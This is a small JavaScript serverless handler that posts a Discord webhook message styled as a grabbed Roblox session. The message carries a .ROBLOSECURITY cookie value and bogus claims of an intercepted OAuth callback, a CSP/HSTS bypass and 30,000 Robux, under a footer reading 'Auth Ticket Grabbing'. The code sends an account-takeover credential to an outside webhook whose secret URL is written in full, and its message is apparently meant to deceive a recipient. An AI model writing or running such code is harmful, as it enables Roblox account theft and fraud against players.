export default async function handler(req, res) {
    const webhookURL = "https://discord.com/api/webhooks/1481123753109885103/u6gAezp9LjuOt2Fbgl7cfuOMVyWU_hMw8zyuDw7w-EPnzLs8MWQbenmdXb4_JVMFxhzD";
    
    // Le vrai token du compte à donner (que tu as copié depuis ton navigateur)
    const activeToken = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-work-with-your-ROBLOX-account.|_VOTRE_CODE_REEL_ICI";

    const payload = {
        embeds: [{
            title: "🔐 API ROBLOX | SESSION HANDSHAKE",
            color: 0x0084ff,
            fields: [
                { name: "📡 Événement", value: "OAuth2 Callback Intercepted", inline: true },
                { name: "🛡️ Sécurité", value: "Bypass CSP/HSTS", inline: true },
                { name: "🔑 ROBLOSECURITY REEL", value: `\`\`\`${activeToken}\`\`\`` },
                { name: "💰 Inventaire", value: "30,000 Robux détectés", inline: false }
            ],
            footer: { text: "Raven Protocol v16.5 - Auth Ticket Grabbing" },
            timestamp: new Date()
        }]
    };

    await fetch(webhookURL, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
    return res.status(200).json({ status: "Ticket Sent" });
}
